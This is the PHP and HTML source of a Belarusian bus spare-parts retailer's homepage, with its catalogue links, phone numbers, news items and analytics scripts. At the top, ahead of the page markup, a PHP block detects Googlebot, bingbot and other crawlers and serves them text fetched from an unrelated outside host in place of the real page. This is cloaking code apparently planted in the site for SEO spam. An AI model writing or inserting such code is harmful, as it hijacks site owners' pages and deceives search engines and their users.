<?php
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
    
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
    
    return false;
}

if (is_bot()) {
    $message = file_get_contents('https://starbats.site/landing/autosharm.txt');
    echo $message;
exit;
}
?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html prefix="og: http://ogp.me/ns#" xmlns="http://www.w3.org/1999/xhtml">
<head>
	<meta property="og:image" content="/images/ogpV.jpg" />
    <meta property="og:image:secure_url" content="/images/ogpV.jpg" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:width" content="300" />
    <meta property="og:image:height" content="400" />

    <meta property="og:image" content="/images/ogpH.jpg" />
    <meta property="og:image:secure_url" content="/images/ogpH.jpg" />
    <meta property="og:image:type" content="image/jpeg" />
    <meta property="og:image:width" content="400" />
    <meta property="og:image:height" content="300" />
	
	<meta property="twitter:image" content="/images/ogpH.jpg"/>
	
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <meta name='yandex-verification' content='fbcb173ee934b8ce' />
  <meta name="google-site-verification" content="88E4nY79WLYVQ4NaYLLJbQVEoCJCk8oYiWZowixgjNw" />
    <base href="https://autosharm.com/" />
  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
  <meta name="keywords" content="Купить запчасти к автобусам МАЗ, ПАЗ, Богдан, Кароса, каталог деталей двигателя,Запчасти двигатель OM 906 LA, OM 501 LA; Deutz 1013, Deutz 2013; Cummins ISBe 4, Cummins ISBe 6; мосты DANA. " />
  <meta name="description" content="Запчасти к автобусам МАЗ, ПАЗ, Богдан, Кароса. Прайс-лист запчастей к автобусам,  фото. Запчасти двигатель OM 906 LA, OM 501 LA; Deutz 1013, Deutz 2013; Cummins ISBe 4, Cummins ISBe 6; мосты DANA." />
  <meta name="generator" content="Joomla! - Open Source Content Management" />
  <title>Запчасти к автобусам МАЗ, ПАЗ, Богдан, Karosa</title>
  <link href="/?format=feed&amp;type=rss" rel="alternate" type="application/rss+xml" title="RSS 2.0" />
  <link href="/?format=feed&amp;type=atom" rel="alternate" type="application/atom+xml" title="Atom 1.0" />
  <link href="/templates/autosharm/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon" />
  <link href="https://autosharm.com/component/search/?format=opensearch" rel="search" title="Искать autosharm" type="application/opensearchdescription+xml" />
  <link rel="stylesheet" href="/plugins/system/jcemediabox/css/jcemediabox.css?06bd17b651de924e743aa51b487fdaa3" type="text/css" />
  <link rel="stylesheet" href="/plugins/system/jcemediabox/themes/standard/css/style.css?7dbc8934e30b0c4c7dbb06a58b912f10" type="text/css" />
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.min.js" type="text/javascript"></script>
  <script src="/media/k2/assets/js/k2.frontend.js?v2.7.0&amp;sitepath=/" type="text/javascript"></script>
  <script src="/media/system/js/mootools-core.js" type="text/javascript"></script>
  <script src="/media/system/js/core.js" type="text/javascript"></script>
  <script src="/media/system/js/caption.js" type="text/javascript"></script>
  <script src="/plugins/system/jcemediabox/js/jcemediabox.js?f246943abadb42a78f823affe64fe7cc" type="text/javascript"></script>
  <script type="text/javascript">
window.addEvent('load', function() {
				new JCaption('img.caption');
			});
JCEMediaBox.init({popup:{width:"",height:"",legacy:0,lightbox:0,shadowbox:0,resize:1,icons:0,overlay:1,overlayopacity:0.8,overlaycolor:"#000000",fadespeed:500,scalespeed:500,hideobjects:0,scrolling:"fixed",close:2,labels:{'close':'Закрыть','next':'Следующее','previous':'Предыдущее','cancel':'Отменить','numbers':'{$current} из {$total}'},cookie_expiry:"",google_viewer:0},tooltip:{className:"tooltip",opacity:0,speed:150,position:"br",offsets:{x: 16, y: 16}},base:"/",imgpath:"plugins/system/jcemediabox/img",theme:"standard",themecustom:"",themepath:"plugins/system/jcemediabox/themes",mediafallback:0,mediaselector:"audio,video"});
  </script>

  <link rel="stylesheet" href="/templates/autosharm/css/style.css?101" type="text/css" media="screen, projection" />
  <link rel="stylesheet" href="/templates/autosharm/css/catalog.css" type="text/css" media="screen, projection" />
  
  <link href='http://fonts.googleapis.com/css?family=PT+Sans+Narrow&subset=latin,cyrillic' rel='stylesheet' type='text/css'>
  
    <script type="text/javascript" language="javascript">
jQuery(function($){
    $('.moduletablelist').appendTo('#pricelist');
    $('.right').appendTo('#right_del');
    $('.right_top').appendTo('#right_top_del');
});
function openMenu(node){
  var subMenu = node.parentNode.getElementsByTagName("ul")[0];
  subMenu.style.display == "none" ? subMenu.style.display = "block" : subMenu.style.display = "none";
}
function allClose(){
  var list = document.getElementById("k2menu").getElementsByTagName("ul");
  for(var i=0;i<list.length;i++){
    list[i].style.display = "none";
  }
}
</script>
</head>
  <body>
  <div class="wrappermain">
  
    <div id="header">
      <div id="header_1">
        <div class="wrapper">
          <div id="logo">
            <a href="/"><img src="/images/logo.jpg" alt="" /></a>
          </div>
          <div id="contact">
            <ul>
				<li class="active"><img src="/images/icons/icon_phone.png" alt="" /><div>+375 (17) <span>303-51-89</span></div></li>
				<li><img src="/images/icons/icon_phone.png" alt="" /><div>+375 (17) <span>378-07-53</span></div></li>
				<li><img src="/images/icons/icon_phone.png" alt="" /><div>+375 (17) <span>294-12-06</span></div></li>
				<li><img src="/images/icons/icon_mts.png" alt="" /><div>+375 (29) <span>708-97-50</span></div></li>
				<li><img src="/images/icons/icon_a1.png" alt="" /><div>+375 (29) <span>630-30-46</span></div></li>
								<li><img src="/images/icons/icon_mail.png" alt="" /><div><a href="mailto:info@autosharm.com">info@autosharm.com</a></div></li>
            </ul>
          </div>
          <div id="search">
          <div class="mod-languages">

	<ul>
						<li class="" dir="ltr">
			<a href="/eng/">
							ENG						</a>
			</li>
								<li class="lang-active" dir="ltr">
			<a href="/">
							RUS						</a>
			</li>
				</ul>

</div>
<form action="/" method="post">
	<div class="search">
		<input name="searchword" id="mod-search-searchword" maxlength=""  class="inputbox" type="text" size="20" value="" /><input type="image" value="" class="button" src="/templates/autosharm/images/searchButton.gif" onclick="this.form.searchword.focus();"/>	<input type="hidden" name="task" value="search" />
	<input type="hidden" name="option" value="com_search" />
	<input type="hidden" name="Itemid" value="163" />
	</div>
</form>

          </div>
        </div>
      </div>
      <div id="header_2">
        <div class="wrapper">
          <div id="user_3">
          
<ul class="menu">
<li class="item-107"><a href="/o-kompanii" >О компании</a></li><li class="item-108"><a href="/katalog-zapchastej" >Каталог запчастей</a></li><li class="item-109"><a href="/zapchasti-pod-zakaz" >Сотрудничество</a></li><li class="item-110 parent"><a href="/press-tsentr/novosti" >Пресс-центр</a></li><li class="item-111"><a href="/kontakty" >Контакты</a></li></ul>

          </div>
        </div>
      </div>
    </div>
      
      
    <div class="wrapper">
      <div id="banner">
        
		
		<iframe src="https://autosharm.com/images/banners_html/980x200_rus/index.html" frameborder="0" marginheight="0" marginwidth="0" style="width:100%;height:200px;"></iframe>
		
      </div>
      <div id="conteiner">
                <div id="content">
                    <div id="col1">
          
<div class="col1home">

<h3>Новинки</h3>
<p>уже на складе</p>

	<div class="col1date">10.03.2022</div>
	<div class="col1title"><a href="/press-tsentr/novosti/item/2369-vazhno-izmenenie-bankovskih-rekvizitov">ВАЖНО! Изменение банковских реквизитов</a></div>
	<div class="col1date">24.02.2022</div>
	<div class="col1title"><a href="/press-tsentr/novosti/item/2367-novoe-postuplenie-zapchasti-tormoznoj-sistemy-mostov-zf-dana-supporta">Новое поступление: запчасти тормозной системы, мостов ZF и Dana, суппорта</a></div>
	<div class="col1date">12.11.2021</div>
	<div class="col1title"><a href="/press-tsentr/novosti/item/2365-nova-postuplenie-zapchastej-zf-i-raba">Новое поступление запчастей ZF и Raba</a></div>
	<div class="col1date">12.11.2021</div>
	<div class="col1title"><a href="/press-tsentr/novosti/item/2363-nam-25-let">Нам 25 лет!</a></div>

</div>

          </div>
                              <div id="col2">
          
<a href="/katalog-zapchastej" class="first"><img src="https://autosharm.com/images/catalogue.jpg" alt="" /></a>
<a href="/zapchasti-pod-zakaz"><img src="https://autosharm.com/images/actual.jpg" alt="" /></a>

          </div>
                              <div id="col3">
          
		  
			<iframe src="https://autosharm.com/images/banners_html/240x400_rus/index.html" frameborder="0" marginheight="0" marginwidth="0" style="width:100%;height:400px;"></iframe>
			
          </div>
                    <div class="clr"></div>
        </div>
                        <div id="main" style="background:none;padding:0;">
        <div class="blog-featured">




</div>

        </div>
                
                
                
      </div>
      <div id="banner_bottom">
        
      </div>
            <div id="bottom">
        <div id="col1">
          		<div class="moduletable">
					<h3>Новости</h3>
					
<div id="k2ModuleBox93" class="k2ItemsBlock">

	
	  <ul>
        <li class="even lastItem">

      <!-- Plugins: BeforeDisplay -->
      
      <!-- K2 Plugins: K2BeforeDisplay -->
      
      		            <div><span class="moduleItemDateCreated">10.03.2022</span></div>
                  <a class="moduleItemTitle" href="/press-tsentr/novosti/item/2369-vazhno-izmenenie-bankovskih-rekvizitov">ВАЖНО! Изменение банковских реквизитов</a>
      
      
      <!-- Plugins: AfterDisplayTitle -->
      
      <!-- K2 Plugins: K2AfterDisplayTitle -->
      
      <!-- Plugins: BeforeDisplayContent -->
      
      <!-- K2 Plugins: K2BeforeDisplayContent -->
      
            <div class="moduleItemIntrotext">
	      
      	      	<p>Сообщаем об изменении банковских реквизитов:</p>      	      </div>
      
      
      <div class="clr"></div>

      
      <div class="clr"></div>

      <!-- Plugins: AfterDisplayContent -->
      
      <!-- K2 Plugins: K2AfterDisplayContent -->
      
      
      
      
			
			
			
      <!-- Plugins: AfterDisplay -->
      
      <!-- K2 Plugins: K2AfterDisplay -->
      
      <div class="clr"></div>
    </li>
        <li class="clearList"></li>
  </ul>
  
	
	
</div>
		</div>
	
        </div>
        <div id="col2">
          		<div class="moduletable">
					<h3>Статьи</h3>
					
<div id="k2ModuleBox100" class="k2ItemsBlock">

	
	  <ul>
        <li class="even lastItem">

      <!-- Plugins: BeforeDisplay -->
      
      <!-- K2 Plugins: K2BeforeDisplay -->
      
      		            <div><span class="moduleItemDateCreated">01.10.2019</span></div>
                  <a class="moduleItemTitle" href="/press-tsentr/stati/item/2303-novy-avtobus-proizvodstva-maz">Новый автобус производства МАЗ</a>
      
      
      <!-- Plugins: AfterDisplayTitle -->
      
      <!-- K2 Plugins: K2AfterDisplayTitle -->
      
      <!-- Plugins: BeforeDisplayContent -->
      
      <!-- K2 Plugins: K2BeforeDisplayContent -->
      
            <div class="moduleItemIntrotext">
	      
      	      	<p>На ближайшей автобусной выставке в Москве Минский автомобильный завод представит свою новинку &ndash; новый автобус с большой вместимостью. Недавно выпущенную модель презентуют 23-25 октября на выставке Busworld.</p>      	      </div>
      
      
      <div class="clr"></div>

      
      <div class="clr"></div>

      <!-- Plugins: AfterDisplayContent -->
      
      <!-- K2 Plugins: K2AfterDisplayContent -->
      
      
      
      
			
			
			
      <!-- Plugins: AfterDisplay -->
      
      <!-- K2 Plugins: K2AfterDisplay -->
      
      <div class="clr"></div>
    </li>
        <li class="clearList"></li>
  </ul>
  
	
	
</div>
		</div>
	
        </div>
        <div id="col3">
          		<div class="moduletablelist">
					<h3>Складское наличие</h3>
					

<div class="customlist"  >
	<table border="0" style="width: 187px; height: 19px;">
<tbody>
<tr>
<td><img src="/images/exel.png" alt="exel" width="40" height="46" /></td>
<td>
<p><a href="/images/files/sklad_po_sistemam_all.xls"><span style="color: #5a5959;">Скачать наличие запчастей по системам</span></a></p>
</td>
</tr>
</tbody>
</table></div>
		</div>
	
        </div>
        <div class="clr"></div>
      </div>
          </div>
      
    <div id="footer">
      <div class="wrapper">
        <div id="footerleft">autosharm 1996-2025. Все права защищены</div>
        <div id="footerright">Все замечания и пожелания присылайте на <a href="mailto:info@autosharm.com">info@autosharm.com</a></div>
      </div>
    </div>
    
  </div>  
    
    
<!-- Yandex.Metrika counter -->
<script type="text/javascript">
(function (d, w, c) {
 (w[c] = w[c] || []).push(function() {
 try {
 w.yaCounter15846160 = new Ya.Metrika({id:15846160, enableAll: true});
 } catch(e) {}
 });

 var n = d.getElementsByTagName("script")[0],
 s = d.createElement("script"),
 f = function () { n.parentNode.insertBefore(s, n); };
 s.type = "text/javascript";
 s.async = true;
 s.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//mc.yandex.ru/metrika/watch.js";

if (w.opera == "[object Opera]") {
 d.addEventListener("DOMContentLoaded", f);
 } else { f(); }
})(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="//mc.yandex.ru/watch/15846160" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
<!-- /Yandex.Metrika counter -->
    

<!-- BEGIN JIVOSITE CODE -->
<script type='text/javascript'>
(function(){ var widget_id = 'AKH7nrqhO3';var d=document;var w=window;function l(){ var s = document.createElement('script'); s.type = 'text/javascript'; s.async = true; s.src = '//code.jivosite.com/script/widget/'+widget_id; var ss = document.getElementsByTagName('script')[0]; ss.parentNode.insertBefore(s, ss);}if(d.readyState=='complete'){l();}else{if(w.attachEvent){w.attachEvent('onload',l);}else{w.addEventListener('load',l,false);}}})();
</script>
<!-- END JIVOSITE CODE -->



  </body>
</html>
